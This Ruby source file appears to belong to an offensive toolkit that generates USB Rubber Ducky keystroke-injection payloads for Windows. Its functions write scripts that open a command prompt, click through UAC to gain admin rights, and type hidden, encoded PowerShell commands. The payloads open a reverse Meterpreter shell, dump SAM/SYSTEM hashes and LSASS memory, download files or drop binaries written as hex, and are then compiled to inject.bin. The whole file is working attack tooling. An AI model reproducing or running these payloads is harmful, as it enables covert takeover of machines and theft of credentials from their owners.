#!/usr/bin/env ruby
require_relative 'core'
include MainCommands
module DuckySetUp
  def admin_with_uac
    "DELAY 2000\nCTRL ESC\nDELAY 200\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500"
    #"DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500"
  end
  def admin_with_out_uac
    "DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500"
  end
  def low_priv
    "DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500"
  end
  def notepad_hex
    "DELAY 2000\nGUI r\nDELAY 500\nSTRING notepad.exe\nENTER\nDELAY 500"
  end
  def save_notepad
    "CTRL s\n#{temp_path}\nEnter\n"
  end
  def ducky_meterpreter_low(encoded_command)
    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
  end
  def ducky_meterpreter_uac(encoded_command)
    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
  end
  def ducky_meterpreter_no_uac(encoded_command)
    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
  end
  def ducky_hash_dump_uac(encoded_command)
    File.open("#{text_path}#{hash_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
  end
  def ducky_hash_dump_no_uac(encoded_command)
    File.open("#{text_path}#{hash_dump_file}", 'w') { |f| f.write("#{admin_with_out_uac}\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER") }
  end
  def ducky_lsass_uac(encoded_command1,encoded_command2)
    File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
  end
  def ducky_lsass_no_uac(encoded_command1,encoded_command2)
    File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
  end
  def ducky_wget_uac(encoded_command)
    File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
  end
  def ducky_wget_no_uac(encoded_command)
    File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
  end
  def ducky_wget_low(encoded_command)
    File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
  end
  def ducky_hex_uac(hex_string,encoded_command)
    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{hex_string}\n#{save_notepad}\n#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
  end
  def ducky_hex_no_uac(hex_string,encoded_command)
    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{hex_string}\n#{save_notepad}\n#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
  end
  def ducky_hex_low(hex_string,encoded_command)
    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{hex_string}\n#{save_notepad}\n#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
  end
  def language_select
    languages = { :'1' => 'us.properties', :'2' => 'be.properties', :'3' => 'it.properties', :'4' => 'dk.properties', :'5' => 'es.properties', :'6' => 'uk.properties', :'7' => 'sv.properties' ,
                  :'8' => 'ru.properties', :'9' => 'pt.properties', :'10' => 'de.properties', :'11' => 'no.properties', :'12' => 'fr.properties'}
    user_pick = Readline.readline("#{get_input("Would you like to change the keyboard layout?[yes/no] ")}",true)
    if user_pick == 'no' or user_pick == ''
      return languages[:"#{1}"]
    else
      language_pick = language_menu
      if language_pick == nil
        print_error("Not a valid choice using #{languages[:"#{1}"]}\n")
        return languages[:"#{1}"]
      else
        print_info("Using #{languages[:"#{language_pick}"]}\n")
        return languages[:"#{language_pick}"]
      end
    end
  end
  def compile_ducky(file_name)
    language = language_select
    print_info("Creating Bin File!\n")
    output = `java -jar #{duck_encode_file}encoder.jar -i #{text_path}#{file_name} -o #{file_root}/inject.bin -l #{language_dir}#{language} 2>&1`
    if output =~ /Exception/
      print_error("Wrong Version of Java\n")
      print_info("Run update-alternatives --config java and select Java 7\n")
      exit
    else
      print_info(output)
      print_success("Bin File Created!\n")
    end
  end
end
